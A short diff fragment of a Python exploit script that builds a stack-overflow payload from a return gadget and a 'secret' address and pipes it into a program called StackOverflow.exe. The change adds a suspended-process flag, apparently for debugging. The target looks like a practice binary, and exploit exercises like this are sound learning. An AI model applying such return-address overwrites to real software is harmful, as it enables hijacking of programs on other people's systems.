@@ -24,5 +24,8 @@ payload+=struct.pack("<Q", ret_gadget)
 
 payload+=struct.pack("<Q", secret_addr)
 
+CREATE_SUSPENDED = 0x4
+
 p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE)
+#p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE,creationflags=CREATE_SUSPENDED)
 p.communicate(input=payload)
